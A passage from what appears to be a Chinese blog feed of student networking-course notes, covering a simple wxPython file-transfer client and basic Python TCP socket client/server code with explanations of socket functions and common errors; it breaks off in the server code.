class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> socket<span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（客户端）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">800</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'请输入服务器IP地址:'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">700</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">265</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'请输入需要下载的文件:'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq2<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>TextCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'text'</span><span class="token punctuation">,</span> style<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>SetMaxLength<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">380</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">450</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择文件存放地址'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an2_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># print('an2,按钮被单击')</span>        dialog <span class="token operator">=</span> wx<span class="token punctuation">.</span>DirDialog<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">"请选择文件存放地址"</span><span class="token punctuation">,</span> style<span class="token operator">=</span>wx<span class="token punctuation">.</span>DD_CHANGE_DIR<span class="token punctuation">)</span>        <span class="token keyword">if</span> dialog<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_OK<span class="token punctuation">:</span>            filename <span class="token operator">=</span> dialog<span class="token punctuation">.</span>GetPath<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>share_dir <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span>            dialog<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk1<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>filename<span class="token operator">=</span>self<span class="token punctuation">.</span>bjk2<span class="token punctuation">.</span>GetValue<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        cmd <span class="token operator">=</span> <span class="token string">"get "</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>filename        <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> <span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"------开始咨询客服---------"</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token comment"># 发命令</span>            <span class="token comment"># get a.txt</span>            <span class="token keyword">if</span> cmd<span class="token operator">==</span><span class="token string">'a'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            phone<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gbk"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 已写的方式打开一个新文件，接收服务器发来的文件的内容写入客户端的新文件</span>            <span class="token comment"># 第一步：先收取报头的长度</span>            obj <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>            header_size <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> obj<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            <span class="token comment"># 第二步：再收报头</span>            header_bytes <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>header_size<span class="token punctuation">)</span>            <span class="token comment"># 第三步：从报头中间解析出对真是数据的描述信息</span>            header_json <span class="token operator">=</span> header_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>            header_dic <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>header_json<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>            total_size <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'file_size'</span><span class="token punctuation">]</span>            filename <span class="token operator">=</span> header_dic<span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span>            <span class="token comment"># 第三步：接受真实的数据</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 在自己的电脑中找一个地址打开一个同类型的文件准备接收数据</span>                recv_size <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">while</span> recv_size <span class="token operator">&lt;</span> total_size<span class="token punctuation">:</span>                    line <span class="token operator">=</span> phone<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    recv_size <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'总大小：%s   已下载大小：%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>total_size<span class="token punctuation">,</span> recv_size<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 显示下载进度</span>            cmd<span class="token operator">=</span><span class="token string">'a'</span>            toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"文件下载完成!"</span><span class="token punctuation">,</span> <span class="token string">"信息提示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>            <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>                <span class="token comment"># 如果点击了提示框的确定按钮</span>                toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># 则关闭提示框</span>        phone<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">myApp</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>App<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">OnInit</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>frame <span class="token operator">=</span> Frame<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>frame<span class="token punctuation">.</span>Show<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> myApp<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>MainLoop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h3><p>这个简单文件传输器是真的简单，基本上还是点对点的下载，只是我想尝试模拟FTP协议，但是发现如果用py开启这个协议，实验完全就是协议的工作了，这个文件传输器就变成了协议开启器。</p><p>在权衡之后，我采用了在服务器端读取设置的共享文件夹的文件名，并将其写成一个文件，客户端通过下载该文件可以实现对其他文件的可知。</p><p>当我在第二天一开始，把这个代码写完时，我以为我接下来的任务会很轻松然后………..</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训记录 </tag>
            
            <tag> 计算机网络 </tag>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络实训</title>
      <link href="/2022/09/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%AE%AD/"/>
      <url>/2022/09/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E8%AE%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="实训一阶段1：基本网络通信"><a href="#实训一阶段1：基本网络通信" class="headerlink" title="实训一阶段1：基本网络通信"></a>实训一阶段1：基本网络通信</h1><blockquote><p>要求：</p><p>开发一个聊天程序；</p><p>包含客户端和服务器端；</p><p>编程语言不限；</p><p>要能在两台PC上运行。</p></blockquote><h2 id="初级阶段1：socket使用"><a href="#初级阶段1：socket使用" class="headerlink" title="初级阶段1：socket使用"></a>初级阶段1：socket使用</h2><p>在TCP中，客户端的实现流程：（1）创建客户端的socket对象   （2）建立与服务器之间的联系  （3）发送请求  （4）接收数据  （5）关闭连接</p><p>服务端的实现流程：（1）创建服务端的socket对象  （2）绑定服务端的地址 （3）设置监听器 （4）等待客户端的连接 （5）接收客户端的请求  （6）返回处理的结果到客户端</p><p><img src="https://img-blog.csdn.net/20180115185303067"></p><p>**套接字(Socket)**，就是对网络中不同主机上的应用进程之间进行双向通信的端点的抽象。一个套接字就是网络上进程通信的一端，提供了应用层进程利用网络协议交换数据的机制。从所处的地位来讲，套接字上联应用进程，下联网络协议栈，是应用程序通过网络协议进行通信的接口，是应用程序与网络协议栈进行交互的接口</p><p><strong>应用程序接口</strong>（英语：<strong>A</strong>pplication <strong>P</strong>rogramming <strong>I</strong>nterface，简称：<strong>API</strong>），又称为<strong>应用编程接口</strong>，就是<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6?fromModule=lemma_inlink">软件</a>系统不同组成部分衔接的约定。</p><pre class="line-numbers language-none"><code class="language-none">socket编程思路TCP服务端：1 创建套接字，绑定套接字到本地IP与端口   # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.bind()2 开始监听连接                   #s.listen()3 进入循环，不断接受客户端的连接请求              #s.accept()4 然后接收传来的数据，并发送给对方数据         #s.recv() , s.sendall()5 传输完毕后，关闭套接字                     #s.close()TCP客户端:1 创建套接字，连接远端地址       # socket.socket(socket.AF_INET,socket.SOCK_STREAM) , s.connect()2 连接后发送数据和接收数据          # s.sendall(), s.recv()3 传输完毕后，关闭套接字          #s.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>subprocess 模块</strong>允许我们启动一个新进程，并连接到它们的输入/输出/错误管道，从而获取返回值。</p></blockquote><blockquote><p>Python3 网络编程</p><p>Python 提供了两个级别访问的网络服务。：</p><ul><li>低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。</li><li>高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</li></ul><p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p><p>网络中进程间如何通信，即利用三元组【ip地址，协议，端口】可以进行网络间通信了，那我们应该怎么实现了，因此，我们socket应运而生，它就是利用三元组解决网络通信的一个中间件工具</p><p>TCP建立连接时要传输三个数据包，俗称三次握手（Three-way Handshaking）。</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token punctuation">[</span>Shake <span class="token number">1</span><span class="token punctuation">]</span> 套接字A：“你好，套接字B，我这里有数据要传送给你，建立连接吧。”<span class="token punctuation">[</span>Shake <span class="token number">2</span><span class="token punctuation">]</span> 套接字B：“好的，我这边已准备就绪。”<span class="token punctuation">[</span>Shake <span class="token number">3</span><span class="token punctuation">]</span> 套接字A：“谢谢你受理我的请求。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><table><thead><tr><th>服务器端套接字</th><th></th></tr></thead><tbody><tr><td>s.bind()</td><td>绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</td></tr><tr><td>s.listen()</td><td>开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。<br/>listen函数中backlog的含义是什么？完成队列的长度 (<a href="https://zhuanlan.zhihu.com/p/78879634">https://zhuanlan.zhihu.com/p/78879634</a>)</td></tr><tr><td>s.accept()</td><td>被动接受TCP客户端连接,(阻塞式)等待连接的到来</td></tr></tbody></table><table><thead><tr><th>客户端套接字</th><th></th></tr></thead><tbody><tr><td>s.connect()</td><td>主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td></tr></tbody></table><table><thead><tr><th>公共用途的套接字函数</th><th></th></tr></thead><tbody><tr><td>s.recv()</td><td>接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td></tr><tr><td>s.send()</td><td>发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td></tr><tr><td>s.close()</td><td>关闭套接字</td></tr></tbody></table><h3 id="代码0-1"><a href="#代码0-1" class="headerlink" title="代码0.1"></a><strong>代码0.1</strong></h3><p><strong>作用：可以实现服务端和客户端简单交互，但仅限同一个局域网内，且一对一，只能发送一句话</strong></p><pre class="line-numbers language-none"><code class="language-none">错误类型：1.LookupError: unknown encoding: uft-8这个错误是记录错误类型的,第一次遇到LookupError ,这个是编码格式本来应该是utf-8 自己打字的时候打错了,打成uft-8 了 所以就出现了这个错误.2.AttributeError: &#39;tuple&#39; object has no attribute &#39;send&#39;错误原因： server.accept()的返回值是一对(conn, address)，其中conn是一个新的套接字对象，可用于在连接上发送和接收数据，地址是绑定到连接另一端的套接字的地址。解决方法：client,addr &#x3D; server.accept()3.TimeoutError: [WinError 10060] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。防火墙没开放该端口网上找到这个……经过24小时检验：socket仅限在局域网使用，所以……一个热点IP和学校内网一起玩……不可能，想的话买个服务器。所以要么开两个学校电脑，要么就在自己电脑上玩耍。host&#x3D;&#39;服务器的静态IP&#39;（IPv4地址）host &#x3D; socket.gethostbyname(socket.gethostname()) （土豆那缺儿，我们一直检验都连不起来原来它是IPv4网关……）4.这个时端口号未开放的原因，在防火墙里开放就行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#客户端</span><span class="token comment">#客户端IP地址：192.168.55.43</span><span class="token comment">#服务器端IP地址：192.168.120.209</span><span class="token keyword">import</span> socket<span class="token comment">#host = socket.gethostname() #获取本地主机名</span>host <span class="token operator">=</span> <span class="token string">'192.168.31.129'</span>port <span class="token operator">=</span> <span class="token number">8800</span> <span class="token comment">#设置端口</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token comment">##第一步：创建嵌套字，连接远端地址</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span> <span class="token comment">#创建socket对象</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#连接服务端，指定主机和端口</span><span class="token comment">##第二步：连接后发送数据/接收数据</span>msg <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token comment">#接收小于1024字节的数据</span><span class="token comment">##第三步：传输完毕，关闭嵌套字</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#服务端</span><span class="token comment">#客户端IP地址：192.168.55.43</span><span class="token comment">#服务器端IP地址：192.168.120.209</span><span class="token keyword">import</span> socket<span class="token comment">#host = socket.gethostname() #获取本地主机名</span>host <span class="token operator">=</span> <span class="token string">'192.168.120.209'</span>port <span class="token operator">=</span> <span class="token number">8800</span><span class="token keyword">print</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token 